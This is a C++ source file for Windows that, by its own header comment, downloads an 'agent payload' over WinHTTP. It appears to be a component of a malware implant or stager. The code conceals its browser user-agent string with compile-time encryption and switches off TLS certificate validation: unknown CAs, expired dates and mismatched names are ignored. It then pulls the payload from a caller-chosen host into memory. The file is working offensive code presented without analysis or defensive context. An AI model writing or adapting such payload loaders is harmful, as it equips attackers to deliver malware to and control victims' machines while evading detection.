// language: C++20, target: Windows 11
// downloads agent payload via WinHTTP — encrypted user-agent string

#include "downloader.h"
#include "crypt.h"
#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

static constexpr auto enc_ua = WENC(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)");

bool download_payload(const wchar_t* host, const wchar_t* path,
                      int port, bool use_tls,
                      std::vector<uint8_t>& out) {

    auto ua = WDEC(enc_ua);

    HINTERNET session = WinHttpOpen(
        ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return false;

    HINTERNET connect = WinHttpConnect(session, host, static_cast<INTERNET_PORT>(port), 0);
    if (!connect) { WinHttpCloseHandle(session); return false; }

    DWORD flags = use_tls ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET request = WinHttpOpenRequest(
        connect, L"GET", path, nullptr,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!request) {
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }

    if (use_tls) {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                        | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                        | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
    }

    if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }

    if (!WinHttpReceiveResponse(request, nullptr)) {
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }

    DWORD status_code = 0;
    DWORD sz = sizeof(status_code);
    WinHttpQueryHeaders(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status_code, &sz, WINHTTP_NO_HEADER_INDEX);
    if (status_code != 200) {
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }

    DWORD available = 0;
    while (WinHttpQueryDataAvailable(request, &available) && available > 0) {
        size_t offset = out.size();
        out.resize(offset + available);
        DWORD read = 0;
        WinHttpReadData(request, out.data() + offset, available, &read);
        out.resize(offset + read);
    }

    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    return !out.empty();
}
